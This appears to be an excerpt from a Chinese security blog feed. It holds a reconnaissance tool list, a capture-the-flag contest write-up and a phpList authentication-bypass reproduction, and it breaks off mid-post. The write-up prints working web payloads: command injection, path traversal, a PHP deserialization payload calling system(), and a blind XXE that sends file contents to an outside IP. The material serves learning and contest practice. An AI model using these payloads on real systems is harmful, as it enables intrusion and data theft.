        <content type="html"><![CDATA[<blockquote><p>记录个人常用的信息搜集工具</p></blockquote><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213224011.jpg" alt></p><a id="more"></a><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="whois是什么"><a href="#whois是什么" class="headerlink" title="whois是什么"></a>whois是什么</h3><p>whois是一种<code>传输协议</code>，<strong>whois查询是一个数据库</strong>。域名查询可以快速了解一家网站的运营者是谁。</p><h3 id="whois可以查询什么信息"><a href="#whois可以查询什么信息" class="headerlink" title="whois可以查询什么信息"></a>whois可以查询什么信息</h3><ol><li>注册信息中的域名所有者的邮箱和名字，域名注册时间，过期时间，注册中心以及当前注册状态</li><li>管理员各种联系信息,包括管理员邮箱，电话，传真，各种名字[可以用来制作字典]</li><li>目标技术的联系方式,包括邮箱，电话，传真，名称</li><li>用于解析该域名的所有ns服务器</li></ol><h3 id="在线查询网站"><a href="#在线查询网站" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="bugscaner-whois"><a href="#bugscaner-whois" class="headerlink" title="bugscaner-whois"></a>bugscaner-whois</h4><p><a href="http://whois.bugscaner.com/" target="_blank" rel="noopener">http://whois.bugscaner.com/</a></p><p>界面很喜欢</p><p>同时bugscaner上还包括很多工具：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211161001.png" alt></p><h4 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h4><p><a href="https://whois.aliyun.com/" target="_blank" rel="noopener">https://whois.aliyun.com/</a></p><h4 id="全球查"><a href="#全球查" class="headerlink" title="全球查"></a>全球查</h4><p><a href="https://www.whois365.com/cn/" target="_blank" rel="noopener">https://www.whois365.com/cn/</a></p><h4 id="爱站"><a href="#爱站" class="headerlink" title="爱站"></a>爱站</h4><p><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p><h4 id="站长"><a href="#站长" class="headerlink" title="站长"></a>站长</h4><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><h4 id="kali自带工具"><a href="#kali自带工具" class="headerlink" title="kali自带工具"></a>kali自带工具</h4><p>结合使用，有些在线网站会屏蔽查询某个域名。</p><h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h2><p>备案信息可以查询<code>注册人姓名</code>等信息。</p><h3 id="在线查询网站-1"><a href="#在线查询网站-1" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="ICP备案查询网"><a href="#ICP备案查询网" class="headerlink" title="ICP备案查询网"></a>ICP备案查询网</h4><p><a href="http://beianbeian.com/" target="_blank" rel="noopener">http://beianbeian.com/</a></p><h4 id="天眼查"><a href="#天眼查" class="headerlink" title="天眼查"></a>天眼查</h4><p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a>  查公司、查老板</p><h4 id="工信部"><a href="#工信部" class="headerlink" title="工信部"></a>工信部</h4><p><a href="http://beian.miit.gov.cn/state/outPortal/loginPortal.action" target="_blank" rel="noopener">http://beian.miit.gov.cn/state/outPortal/loginPortal.action</a></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="在线查询网站-2"><a href="#在线查询网站-2" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="云悉资产"><a href="#云悉资产" class="headerlink" title="云悉资产"></a>云悉资产</h4><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><h4 id="在线子域名爆破"><a href="#在线子域名爆破" class="headerlink" title="在线子域名爆破"></a>在线子域名爆破</h4><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211142030.png" alt></p><h4 id="DNSdumpster"><a href="#DNSdumpster" class="headerlink" title="DNSdumpster"></a>DNSdumpster</h4><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p>演示结果</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211144726.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211144602.png" alt></p><h4 id="通过证书查找子域名（Crt-sh）"><a href="#通过证书查找子域名（Crt-sh）" class="headerlink" title="通过证书查找子域名（Crt.sh）"></a>通过证书查找子域名（Crt.sh）</h4><p><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211145107.png" alt></p><h4 id="通过证书查找子域名（censys）"><a href="#通过证书查找子域名（censys）" class="headerlink" title="通过证书查找子域名（censys）"></a>通过证书查找子域名（censys）</h4><p><a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a></p><p>查找子域名这方面比较鸡肋：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211142236.png" alt></p><p>会查到<code>www.chongqing-baidu.com</code>这种无用的网站</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211142342.png" alt></p><p>菠菜而已。</p><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><p><code>site:zhihu.com</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211145305.png" alt></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h4><p>字典要大</p><h4 id="Sublist3r"><a href="#Sublist3r" class="headerlink" title="Sublist3r"></a>Sublist3r</h4><p><strong>开源工具</strong>。它可以从<strong>多个源</strong>中获取查询的输出结果，如google，bing，virustotal，crt.sh等，虽然绝大多数情况下它所返回的数据都是正确的，但也有可能会遇到一些无法解析的子域名</p><p>Sublist3r还使用了一个名叫<strong>subbrute</strong>的独立项目，而Subbrute使用了一个常用子域名字典，并通过这个字典来找出可以正常解析的子域名集合 </p><ul><li>－d：枚举指定域名的子域名 </li><li>－b：使用subbrute模块 </li><li>－v：实时列举搜索结果 </li><li>－t：设置使用subbrute暴力破解的线程数 </li><li>－o：将结果保存为文本文件 </li><li>－h：帮助</li></ul><p>在我的主机上使用<code>python2</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211154319.png" alt></p><p>还可以同时使用暴力破解模块：</p><p><code>python sublist3r.py -b -d zhihu.com</code></p><h2 id="Web指纹查询"><a href="#Web指纹查询" class="headerlink" title="Web指纹查询"></a>Web指纹查询</h2><p>Web指纹简介：</p><p><img src="https://pic2.zhimg.com/80/133c88180340b844466e8fa5552e122b_hd.jpg" alt></p><h3 id="在线查询网站-3"><a href="#在线查询网站-3" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="云悉指纹"><a href="#云悉指纹" class="headerlink" title="云悉指纹"></a>云悉指纹</h4><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><h4 id="在线CMS指纹识别"><a href="#在线CMS指纹识别" class="headerlink" title="在线CMS指纹识别"></a>在线CMS指纹识别</h4><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200211155546.png" alt></p><h4 id="火狐插件-Wappalyzer"><a href="#火狐插件-Wappalyzer" class="headerlink" title="火狐插件-Wappalyzer"></a>火狐插件-Wappalyzer</h4><p>识别出来的比较简单</p><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p>kali集成</p><p>推荐使用<code>-v</code>参数：<code>whatweb -v aliyun.bugscaner.com</code>  更详细并且格式化。</p><h2 id="端口指纹搜集"><a href="#端口指纹搜集" class="headerlink" title="端口指纹搜集"></a>端口指纹搜集</h2><h3 id="在线查询网站-4"><a href="#在线查询网站-4" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><h4 id="在线端口检测"><a href="#在线端口检测" class="headerlink" title="在线端口检测"></a>在线端口检测</h4><p><a href="http://coolaf.com/tool/port" target="_blank" rel="noopener">http://coolaf.com/tool/port</a></p><h4 id="在线端口扫描"><a href="#在线端口扫描" class="headerlink" title="在线端口扫描"></a>在线端口扫描</h4><p><a href="https://www.ip33.com/port_scan.html" target="_blank" rel="noopener">https://www.ip33.com/port_scan.html</a></p><p><a href="http://duankou.wlphp.com/" target="_blank" rel="noopener">http://duankou.wlphp.com/</a></p><p><a href="http://www.nicetool.net/app/port_scan.html" target="_blank" rel="noopener">http://www.nicetool.net/app/port_scan.html</a></p><h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><h4 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h4><ul><li><code>-p</code> 指定扫描的端口：<code>-p80,8080-8100</code></li><li><code>--rate</code> 指定发包的速率：<code>--rate 100000</code></li></ul><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><ul><li><p><code>-sS</code> 执行一次隐秘的TCP扫描</p></li><li><p><code>-Pn</code> 会告诉nmap不要使用ping命令预先判断主机是否存活，而是默认所有主机都是存活状态</p></li><li><p><code>-A</code> 参数会显示更详细的信息，同时扫描的时间也会更长</p></li><li><p><code>-p</code> 参数指定端口：<code>-p1-65535</code>、<code>-p20-200,7777,8888</code></p></li></ul><p><code>nmap -sS -Pn -A -p20-200,7777 192.168.91.132</code></p><h3 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h3><p><a href="https://github.com/BestBDs/port-bug/blob/master/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">https://github.com/BestBDs/port-bug/blob/master/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E</a></p><h2 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h2><h3 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h3><p>主要看字典大小</p><h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><h2 id="敏感信息-网络空间资产搜索"><a href="#敏感信息-网络空间资产搜索" class="headerlink" title="敏感信息-网络空间资产搜索"></a>敏感信息-网络空间资产搜索</h2><h3 id="Google-hacking语法"><a href="#Google-hacking语法" class="headerlink" title="Google hacking语法"></a>Google hacking语法</h3><ul><li><code>site</code>：指定域名</li><li><code>inurl</code>：指定url中存在的关键字</li><li><code>intext</code>：指定网页正文中的关键字</li><li><code>filetype</code>：指定文件类型</li><li><code>intitle</code>：指定网页标题中的关键字</li><li><code>link</code>：返回所有和link做了链接的url</li><li><code>info</code>：查找指定站点的一些基本信息</li><li><code>cache</code>：搜索Google里关于某些内容的缓存</li></ul><p><strong>谷歌漏洞库</strong>：<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200212155216.png" alt></p><h3 id="GitHub上的敏感信息"><a href="#GitHub上的敏感信息" class="headerlink" title="GitHub上的敏感信息"></a>GitHub上的敏感信息</h3><p><code>仓库搜索</code>、<code>代码搜索</code>、<code>问题搜索</code>、<code>用户名搜索</code>的结果分别在以下框框中。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200212170222.png" alt></p><h4 id="（1）-基本搜索（Basic-search）"><a href="#（1）-基本搜索（Basic-search）" class="headerlink" title="（1） 基本搜索（Basic search）"></a>（1） 基本搜索（Basic search）</h4><ul><li>查找stars数超过100的有关”cat”仓库：<code>cat stars:&gt;100</code></li><li>搜索用户名为<code>fengbingchun</code>的<strong>所有仓库</strong>：<code>user:fengbingchun</code></li><li>搜索地址在”San Francisco, CA”的<strong>用户名</strong>包含tom的所有仓库：<code>tom location:&quot;San Francisco, CA&quot;</code>（<strong>搜用户</strong>）</li><li>搜索不包含关于”cat”的所有仓库：<code>NOT cat</code></li></ul><h4 id="（2）-仓库搜索（Repository-search）"><a href="#（2）-仓库搜索（Repository-search）" class="headerlink" title="（2） 仓库搜索（Repository search）"></a>（2） 仓库搜索（Repository search）</h4><ul><li>搜索有关”node.js”并fork数少于200的所有仓库：<code>node.js forks:&lt;200</code></li><li>搜索有关”jquery”并<strong>大小</strong>在1024至4089KB之间的所有仓库：<code>jquery size:1024..4089</code></li><li>搜索用户名为fengbingchun并且开发语言为C++的所有仓库：<code>language:c++ user:fengbingchun</code></li><li>搜索用户名为fengbingchun并且followers数大于等于10的所有仓库：<code>user:fengbingchun followers:&gt;=10</code></li><li>搜索用户名为fengbingchun并且<strong>仓库在2019年1月1日后有更新</strong>（<strong>pushed</strong>）的所有仓库：<code>user:fengbingchun pushed:&gt;2019-01-01</code></li></ul><h4 id="（3）-代码搜索（Code-search）"><a href="#（3）-代码搜索（Code-search）" class="headerlink" title="（3） 代码搜索（Code search）"></a>（3） 代码搜索（Code search）</h4><ul><li>搜索用户名为fengbingchun并且<strong>文件中含有”cv::Mat”</strong>的<strong>所有文件</strong>：<code>cv::Mat user:fengbingchun</code></li><li>搜索文件大小大于1000KB并文件中包含”system”的所有文件：<code>system size:&gt;1000</code></li><li>搜索<strong>在/docs/路径下</strong>文件中<strong>含有”examples”的所有文件</strong>：<code>examples path:/docs/</code></li></ul><h4 id="（4）-问题搜索（Issue-search）"><a href="#（4）-问题搜索（Issue-search）" class="headerlink" title="（4） 问题搜索（Issue search）"></a>（4） 问题搜索（Issue search）</h4><ul><li>搜索用户名为fengbingchun并<strong>issue中含有”opencv”字段</strong>的所有issues：<code>opencv user:fengbingchun</code></li><li>搜索<strong>issue是open状态</strong>并且issue中含有”fengbingchun”字段的所有issues：<code>fengbingchun is:open</code></li><li>搜索issue中<strong>comments数大于4次</strong>且含有”fengbingchun”字段的所有issues：<code>fengbingchun comments:&gt;4</code></li><li>搜索<strong>issue创建者</strong>是fengbingchun的所有issues：<code>author:fengbingchun</code></li><li>搜索<strong>issue在2019年2月15日后创建</strong>的且含有”opencv”字段的所有issues：<code>opencv created:&gt;2019-03-15</code></li></ul><h4 id="（5）-用户名搜索（User-search）"><a href="#（5）-用户名搜索（User-search）" class="headerlink" title="（5） 用户名搜索（User search）"></a>（5） 用户名搜索（User search）</h4><ul><li>搜索<strong>用户全名</strong>为”Bingchun Feng”的用户：<code>fullname:&quot;Bingchun Feng&quot;</code></li></ul><h4 id="（6）-高级搜索（Advanced-search）"><a href="#（6）-高级搜索（Advanced-search）" class="headerlink" title="（6） 高级搜索（Advanced search）"></a>（6） 高级搜索（Advanced search）</h4><p><a href="https://github.com/search/advanced" target="_blank" rel="noopener">https://github.com/search/advanced</a></p><p><strong>注意事项</strong>：</p><ul><li><strong>冒号<code>:</code>两侧不能有空格</strong></li><li><strong>不区分大小写</strong></li><li><strong>不能将以下通配符用作搜索查询的一部分，搜索将忽略这些符号：. , : ; / \ ` ‘ “ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } [ ]</strong></li><li><strong>搜索默认为master分支</strong></li></ul><p>fofa：<a href="https://zhuanlan.zhihu.com/p/46245762" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46245762</a></p><p>Google hacking</p><p>shodan</p><p>zoomeye：<a href="https://www.zhihu.com/question/23389858" target="_blank" rel="noopener">https://www.zhihu.com/question/23389858</a></p><h2 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h2><h3 id="判断是否使用了CDN"><a href="#判断是否使用了CDN" class="headerlink" title="判断是否使用了CDN"></a>判断是否使用了CDN</h3><h4 id="全球ping检测"><a href="#全球ping检测" class="headerlink" title="全球ping检测"></a>全球ping检测</h4><p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></p><p><a href="https://wepcc.com/" target="_blank" rel="noopener">https://wepcc.com/</a></p><h4 id="域名解析记录"><a href="#域名解析记录" class="headerlink" title="域名解析记录"></a>域名解析记录</h4><p><a href="https://site.ip138.com/" target="_blank" rel="noopener">https://site.ip138.com/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213111219.png" alt></p><h3 id="绕过CDN查询真实IP"><a href="#绕过CDN查询真实IP" class="headerlink" title="绕过CDN查询真实IP"></a>绕过CDN查询真实IP</h3><h4 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a>VirusTotal</h4><p>大名鼎鼎的 <code>VirusTotal</code>，支持恶意文件，恶意URL的检测，也可以绕过CDN查询真实IP</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213114115.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213114138.png" alt></p><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><ul><li><p><strong>子域名IP</strong></p><p>由于成本问题，可能某些厂商并不会将所有的子域名都部署 CDN，所以如果我们能尽量的搜集子域名，或许可以找到一些没有部署 CDN 的子域名，拿到某些服务器的真实 <code>ip/ 段</code></p></li><li><p><strong>旁站IP</strong></p><p>whois查询域名所有者的其他域名，可能与目标域名在同一个服务器上，并且未作CDN</p></li><li><p><strong>查找泄露文件</strong></p><p><code>phpinfo</code>、<code>GitHub泄露等</code></p></li><li><p><strong>利用目标网站<code>证书</code>或者<code>favicon.ico</code></strong></p><p>在<code>https://crt.sh</code>查找网站SSL证书的<code>hash</code>，然后再用censys搜索</p><p>利用<code>favicon.ico</code>和<code>shodan</code>：<a href="https://github.com/Ridter/get_ip_by_ico" target="_blank" rel="noopener">https://github.com/Ridter/get_ip_by_ico</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020.2.9星盟AWD邀请赛复盘</title>
      <link href="/passages/2020-2-9-2020-2-9%E6%98%9F%E7%9B%9FAWD%E9%82%80%E8%AF%B7%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
      <url>/passages/2020-2-9-2020-2-9%E6%98%9F%E7%9B%9FAWD%E9%82%80%E8%AF%B7%E8%B5%9B%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>感谢星盟安全团队的再一次邀请！</p></blockquote><a id="more"></a><p>星盟安全团队举办的线上AWD，三道Web题，两道pwn题。又学到了很多新姿势。</p><p>记录下三道Web题中我们发现的漏洞和做题过程。</p><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>上D盾：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220003.png" alt></p><h3 id="test-php中的预置后门："><a href="#test-php中的预置后门：" class="headerlink" title="test.php中的预置后门："></a><code>test.php</code>中的预置后门：</h3><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220253.png" alt></p><p>赶紧<strong>删文件</strong>，写个脚本批量打。</p><p><strong>payload</strong>：<code>http://39.100.119.37:10480/test.php?out=cat /flag</code></p><h3 id="shell-函数的命令执行漏洞"><a href="#shell-函数的命令执行漏洞" class="headerlink" title="shell()函数的命令执行漏洞"></a>shell()函数的命令执行漏洞</h3><p>在<code>admin/func.php</code>中存在有漏洞的<code>shell</code>函数：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220549.png" alt></p><p><strong>如何快速发现哪个文件调用了shell函数</strong>？</p><p>熟悉代码审计的师傅应该知道<code>ctags</code>和<code>在文件夹中搜索</code>这两个功能。</p><ul><li><p><code>ctags</code>就是定位被调用函数的定义文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220939.png" alt></p><p>这样就能快速找到定义这个函数的文件所在行。</p></li><li><p><code>在文件夹中搜索</code>是一般编辑器都有的功能</p><p>我使用<code>sublime</code>，在文件夹中搜索<code>shell</code>，很快就发现在哪处调用了该函数</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221209.png" alt></p></li></ul><p>利用该漏洞需要先登录后台</p><p>后台登录账号密码：<code>admin111</code>:<code>admin111</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221354.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221403.png" alt></p><p><strong>payload</strong>：<code>?shell&amp;out=127.0.0.1;cat /flag</code></p><p><strong>修复方案</strong>：过滤out参数，如果其含有flag字样，直接<code>exit();</code>（这样不严谨，但当时时间紧迫，先这样处理）</p><p>更好的修复方案，shell完成的功能是<code>ping</code>命令，那么我们就使用正则来过滤输入的参数是否是正常的域名或者IP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^(?=^.&#123;3,255&#125;$)[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-z0-9A-Z][-a-zA-Z0-9]&#123;0,62&#125;)+$|^((25[0-5]|2[0-4]\d|[01]?\d\d?)($|(?!\.$)\.))&#123;4&#125;$/'</span>, $target))</span><br></pre></td></tr></table></figure><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="假的预置后门"><a href="#假的预置后门" class="headerlink" title="假的预置后门"></a>假的预置后门</h3><p>同Web1一样，在网站根目录下有一个<code>test.php</code>的假后门</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221725.png" alt></p><p>一开始D盾扫到还挺兴奋的，但利用起来完全没作用</p><p>源码中已经输出了<code>$_</code>、<code>$__</code>、<code>$___</code>的值，跟注释中的<code>$_=&#39;assert&#39;;</code>完全不一样，大概就是出题人皮了一下。</p><p>pass掉。</p><h3 id="目录跳转漏洞"><a href="#目录跳转漏洞" class="headerlink" title="目录跳转漏洞"></a>目录跳转漏洞</h3><p><code>admin/grade.php</code>中，接收文件名，并将文件内容输出到浏览器</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222506.png" alt></p><p><strong>payload</strong>：<code>http://39.100.119.37:21680/admin/grade.php?file=../../../../flag</code></p><p><strong>修复方案</strong>：正则匹配<code>..</code>，防止目录遍历</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222935.png" alt></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><code>login/logout.php</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209223250.png" alt></p><p>比较简单的反序列化利用</p><p><strong>payload</strong>：<code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:4:&quot;male&quot;;s:15:&quot;system(&#39;cat /flag&#39;);&quot;;}</code></p><p><strong>修复方案</strong>：多余的操作，直接删除<code>unserialize($_POST[&#39;un&#39;]);</code></p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>Web3的MySQL服务一直有问题，直到比赛结束前半个小时才恢复。</p><h3 id="盲XXE"><a href="#盲XXE" class="headerlink" title="盲XXE"></a>盲XXE</h3><p><code>loginCheck.php</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209230947.png" alt></p><p>登录是通过XML传递<code>username</code>和<code>password</code>参数，而传递的xml我们可控，没有回显，盲XXE读取文件。</p><p>XML：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://47.112.16.34/xml.dtd&quot;&gt;  </span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;aaa&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>外部<code>DTD</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://47.112.16.34:1337/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>在VPS上监听 <code>nc -lp 1337 -vv</code></p><p>抓包请求：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209231527.png" alt></p><p>VPS接收到请求：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209231654.png" alt></p><p>关于盲XXE更多参考学习：<a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>赛后在群里看了下其他师傅分享的思路，不得不服，被骚到了。。最重要的还是权限维持。</p><p>骚思路：</p><p>建立<code>软链接文件</code>到<code>/flag</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209232517.png" alt></p><p>还有发现平台漏洞，拿到所有主机的登录密码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200210144759.jpg" alt></p><p>太强了，向师傅们学习！</p>]]></content>
      
      
      <categories>
          
          <category> AWD </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpList 3.5.0 - Authentication Bypass 漏洞复现</title>
      <link href="/passages/2020-2-8-phpList-3-5-0-Authentication-Bypass-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/passages/2020-2-8-phpList-3-5-0-Authentication-Bypass-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>phpList是用于<strong>管理邮件列表</strong>的开源软件。它设计用于向订户列表传播信息，例如新闻通讯，新闻，广告。它用<strong>PHP编写</strong>，并使用MySQL数据库存储信息。phpList是免费的开源软件。</p><p><a href="https://www.exploit-db.com/exploits/47989" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47989</a></p><p>管理员后台登录的密码散列使用了<code>==</code>而不是<code>===</code>验证</p></blockquote><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>源码下载（sourceforge）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sourceforge.net/projects/phplist/files/phplist-development/3.5.0-RC1/</span><br></pre></td></tr></table></figure><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209000736.png" alt></p><p>解压后直接找到这个目录：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209233551.png" alt></p><p>将这个<code>lists</code>拷贝到网站目录下并且重命名。</p><p>修改<code>config/config.php</code>配置文件，设置要连接的数据库和账户密码</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209234127.png" alt></p><p>同时建立<code>phplistdb</code>数据库。</p><p>访问<code>http://127.0.0.1/phplist/admin/</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>初始化安装，设置管理员的账号密码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235358.png" alt></p><p>这里的密码要设置成 sha256 后以<code>0e</code>开头的字符串，如 <code>TyNOQHUS</code></p><p>我们再次访问后台，以密码 <code>34250003024812</code>进行登录，其sha256后也是以<code>0e</code>开头</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235609.png" alt></p><p>登录成功：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235804.png" alt></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>找到验证管理员登录的php文件<code>phpListAdminAuthentication.php</code></p><p>关键代码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235958.png" alt></p><p>可以看到<code>$encryptedPass</code>（密码sha256后的值）是使用<code>==</code>来判断和数据库中的值是否一样。PHP弱类型比较，就会造成<code>0exxxxx == 0eyyyyy</code>（会把每一个以”0e”开头的哈希值都解释为0）</p><h2 